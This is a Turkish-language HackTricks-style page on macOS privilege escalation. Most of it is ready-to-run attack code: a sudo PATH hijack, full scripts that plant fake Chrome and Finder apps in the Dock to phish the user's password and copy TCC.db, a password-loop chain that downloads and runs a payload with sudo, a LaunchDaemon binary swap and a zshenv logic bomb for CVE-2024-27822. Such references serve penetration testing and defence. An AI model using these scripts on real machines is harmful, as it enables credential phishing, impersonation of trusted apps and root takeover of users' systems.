# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation arıyorsanız, şuraya gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux veya diğer Unix benzeri sistemleri etkileyen birçok privilege-escalation tekniği macOS için de geçerlidir. Şuraya bakın:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Kullanıcı Etkileşimi

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation yazısında](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değişkenini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **sudo çalıştırırken** kullanmaya devam edeceği diğer ikili dosyaları **ele geçirmek** olduğu anlamına gelir:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Terminal kullanan bir kullanıcının **Homebrew yüklemiş olma ihtimali çok yüksektir**. Bu nedenle **`/opt/homebrew/bin`** içindeki ikili dosyaları ele geçirmek mümkündür.

### Dock Taklidi

Biraz **social engineering** kullanarak Dock'ta örneğin **Google Chrome'u taklit edebilir** ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin. Varsa bu girdiyi **kaldırın** ve **sahte Chrome girdisini Dock dizisinde aynı konuma ekleyin**.

<details>
<summary>Chrome Dock taklit script'i</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek Finder'ın hemen yanına koyabilirsiniz. Bunun için sahte Finder girdisini Dock dizisinin **başına eklemeniz gerekir**.
- Başka bir seçenek de onu Dock'a koymayıp doğrudan açmaktır; "Finder'ın Finder'ı denetlemek istemesi" pek de garip değil.
- Korkunç bir kutu göstererek parola sormadan **root yetkilerine yükselmenin** başka bir yolu, Finder'ın ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola istemesini sağlamaktır:
  - Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parola isteyen uyarıda "Finder sudo dosyasını kopyalamak istiyor" yazar.)
  - Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol ederek parola isteyen uyarıda "Finder Finder.bundle dosyasını kopyalamak istiyor" yazmasını sağlayabilirsiniz.)

<details>
<summary>Finder Dock kimliğine bürünme betiği</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware, kullanıcı etkileşimini kötüye kullanarak **sudo yetkisi olan bir parolayı ele geçirir** ve bunu programatik olarak yeniden kullanır. Yaygın bir akış:

1. `whoami` ile oturum açmış kullanıcıyı belirle.
2. `dscl . -authonly "$user" "$pw"` başarılı olana kadar parola istemlerini **döngüye al**.
3. Kimlik bilgisini önbelleğe al (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` ile yürüt (parola stdin üzerinden).

En basit zincir örneği:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Çalınan parola daha sonra **`xattr -c` ile Gatekeeper karantinasını kaldırmak**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimsiz olarak çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>

## Yeni macOS'e özgü vektörler (2023–2026)

### Kullanımdan kaldırılan `AuthorizationExecuteWithPrivileges` hâlâ kullanılabiliyor

`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Pek çok ticari güncelleyici, güvenilmeyen bir yol ile `/usr/libexec/security_authtrampoline` çağırıyor. Hedef binary kullanıcı tarafından yazılabilir durumdaysa bir trojan yerleştirip meşru istemden yararlanabilirsiniz:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

**Yukarıdaki masquerading tricks** ile birleştirerek inandırıcı bir parola iletişim kutusu gösterin.


### Ayrıcalıklı yardımcı / XPC ön incelemesi

Modern üçüncü taraf macOS privesc’lerinin çoğu aynı örüntüyü izler: **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** içinden bir **Mach/XPC service** sunar; ardından yardımcı ya **client’ı doğrulamaz**, **çok geç doğrular** (PID race) ya da **user-controlled path/script** kullanan bir **root method** sunar. VPN istemcileri, oyun başlatıcıları ve güncelleyicilerdeki yakın tarihli birçok helper hatasının arkasında bu hata sınıfı vardır.<sup>[[2]](#references)</sup>

Hızlı ön inceleme kontrol listesi:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Özellikle şu özelliklere sahip helper'lara dikkat edin:

- iş `launchd`'de yüklü kaldığı için **kaldırma işleminden sonra** istekleri kabul etmeye devam edenler
- **`/Applications/...`** veya root olmayan kullanıcıların yazabildiği diğer yollardan script çalıştıran ya da yapılandırma okuyanlar
- yarış koşuluna açık olabilecek **PID tabanlı** veya yalnızca **bundle-id** kullanan eş doğrulamasına dayananlar

Helper yetkilendirme hataları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.

### PackageKit script ortamı devralma (CVE-2024-27822)

Apple **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde bu sorunu giderene kadar, kullanıcı tarafından başlatılan **`Installer.app`** / **`PackageKit.framework`** kurulumları **PKG script'lerini root olarak, mevcut kullanıcının ortamında** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir paketin, kurban paketi yüklediğinde saldırganın **`~/.zshenv`** dosyasını yükleyip root olarak çalıştırabileceği anlamına gelir.<sup>[[3]](#references)</sup>

Bu durum özellikle bir **logic bomb** olarak ilgi çekicidir: kullanıcının hesabında bir foothold ve yazılabilir bir shell başlangıç dosyası yeterlidir; ardından kullanıcının zsh tabanlı savunmasız herhangi bir installer'ı çalıştırmasını beklersiniz. Bu genellikle **MDM/Munki** dağıtımları için geçerli değildir; çünkü bunlar root kullanıcısının ortamında çalışır.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Daha ayrıntılı şekilde installer odaklı kötüye kullanımı incelemek isterseniz [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.

### `.localized` üzerinden installer hedef çakışması

Bazı üçüncü taraf installer'lar, çalıştırılabilir dosyasına `/Applications/Target.app` içinde sabit bir yol üzerinden başvurulan bir root LaunchDaemon kaydeder. Bir saldırgan bu bundle'ı önce **farklı bir bundle identifier** ile oluşturabilirse Installer, yem olarak oluşturulan bundle'ı koruyup gerçek uygulamayı `/Applications/Target.localized/Target.app` konumuna yerleştirebilir. Daemon yine de ilk yola işaret eder. Bu nedenle, yem bundle'ın içindeki saldırgan denetimindeki bir çalıştırılabilir dosya daha sonra root olarak çalışabilir.<sup>[[8]](#references)</sup>

Önemli ön koşullar şunlardır:<sup>[[8]](#references)</sup>

1. Saldırgan beklenen uygulama yolunu oluşturabilir veya denetleyebilir.
2. Paket, çakışan bundle'ı kaldırmaz.
3. Ayrıcalıklı iş, bu bundle içindeki sabit kodlanmış bir yolu kullanır.
4. Kullanıcı veya bir MDM iş akışı paketi yükler ve işi kaydeder.

Yer değiştirmiş bundle'ları bulun ve ardından sonraki bölümdeki enumeration döngüsüyle LaunchDaemon hedeflerini inceleyin:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Daha güvenli bir installer, bundle'ın nihai konumunu çözümler ve ayrıcalıklı executable dosyalarını `/Library/PrivilegedHelperTools` gibi root sahipli bir konumda tutar. Ayrıca job'ı kaydetmeden veya başlatmadan önce sahipliği ve code signing'i doğrulamalıdır.<sup>[[8]](#references)</sup>

### Yazılabilir LaunchDaemon hedefinin ele geçirilmesi

Bir LaunchDaemon plist dosyası root sahipli olabilir, ancak `Program` veya ilk `ProgramArguments` girdisi kullanıcının yazabildiği bir dizini gösterebilir. Yalnızca executable dosyasının izinlerini değil, **yolun tamamını** kontrol edin. Üst dizin yazılabiliyorsa saldırgan, root sahipli bir executable dosyasının adını değiştirebilir ve aynı yolda onun yerine geçecek bir dosya oluşturabilir. Bu dosya, job bir sonraki başlatıldığında root olarak çalışır. Yeniden başlatma veya normal bir servis yeniden başlatması yeterlidir. Saldırganın system domain'de `launchctl bootstrap` çalıştırma iznine ihtiyacı yoktur.<sup>[[7]](#references)</sup>

Önce her hedefi ve doğrudan üst dizinini listeleyin:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Dosya veya üst dizini yazılabilir olduğunda, özgün binary'yi koruyup yolu çalıştırılabilir bir payload ile değiştirin. Ardından önceden yüklenmiş daemon'ın yeniden başlamasını bekleyin.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR kimlik bilgisi işaretçisi race (CVE-2025-24118)

Güvenlik açığı içeren `kauth_cred_proc_update` yolu, SMR okuyucuları işaretçiyi kilit kullanmadan yüklerken `proc_ro.p_ucred` değerini atomik olmayan `zalloc_ro_mut` API’siyle güncelliyordu. Herkese açık tetikleyici, özel olarak hazırlanmış bir setgid binary kullanır. Bir thread gerçek ve etkin grup kimlikleri arasında geçiş yaparken başka bir thread `getgid()` gibi bir syscall’a tekrar tekrar girer.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Bunu hazır bir root exploit değil, bir **race primitive** olarak değerlendirin. Yayımlanan PoC, parçalanmış bir credential pointer gösteriyor. Bu genellikle kernel panic ile sonuçlanıyor. Araştırmacı bozulmayı yalnızca Intel üzerinde yeniden üretebildi ve ortaya çıkan credential nesnesi üzerinde deterministik kontrol sağlayamadı. Apple, macOS 15.3'te güncellemeyi atomik bir pointer değişimiyle yaptı.<sup>[[4]](#references)</sup>

### Migration Assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Zaten root yetkiniz olsa bile SIP, sistem konumlarına yazmayı engeller. **Migraine** açığı, Migration Assistant yetkilendirmesi `com.apple.rootless.install.heritable` üzerinden SIP bypass'ı miras alan ve korumalı yolların (ör. `/System/Library/LaunchDaemons`) üzerine yazan bir alt süreç başlatır.<sup>[[5]](#references)</sup> Saldırı zinciri:

1. Çalışan bir sistemde root yetkisi elde edin.
2. Saldırganın kontrolündeki bir ikili dosyayı çalıştırması için `systemmigrationd` sürecini hazırlanmış durum verileriyle tetikleyin.
3. SIP korumalı dosyalara yama uygulamak için miras alınan yetkilendirmeyi kullanın; yapılan değişiklikler yeniden başlatma sonrasında da kalıcı olur.

### NSPredicate/XPC ifade kaçakçılığı (CVE-2023-23530/23531 hata sınıfı)

Birden fazla Apple daemon'u XPC üzerinden **NSPredicate** nesnelerini kabul eder ve yalnızca saldırgan tarafından kontrol edilebilen `expressionType` alanını doğrular. Rastgele selector'ları değerlendiren bir predicate hazırlayarak **root/system XPC servislerinde** (ör. `coreduetd`, `contextstored`) **code execution** elde edebilirsiniz. İlk olarak bir uygulama sandbox'ından kaçışla birleştirildiğinde bu, **kullanıcıdan onay almadan yetki yükseltme** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor kullanmayan XPC uç noktalarını araştırın.<sup>[[6]](#references)</sup>

## TCC - Root Yetki Yükseltme

### CVE-2020-9771 - mount_apfs TCC bypass ve yetki yükseltme

**Herhangi bir kullanıcı** (yetkisiz kullanıcılar bile) `-o noowners` seçeneğiyle bir Time Machine snapshot'ı oluşturup bağlayabilir ve bu snapshot'taki **TÜM dosyalara erişebilir**; böylece canlı volume üzerindeki sahiplik denetimlerini atlatabilir. Gereken tek yetki, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) iznine sahip olmasıdır.

Komutlar ve açıklamanın tamamı TCC bypasses sayfasında:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Hassas Bilgiler

Bu, yetki yükseltmek için faydalı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS için AWS Client VPN'de Yerel Yetki Yükseltme](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit'te Yetki Yükseltme](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS ve iOS'ta yeni bir yetki yükseltme hata sınıfı (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: güvenli olmayan klasör izinleri üzerinden yetki yükseltme ve kalıcılık](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS'ta .localized dizini üzerinden LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
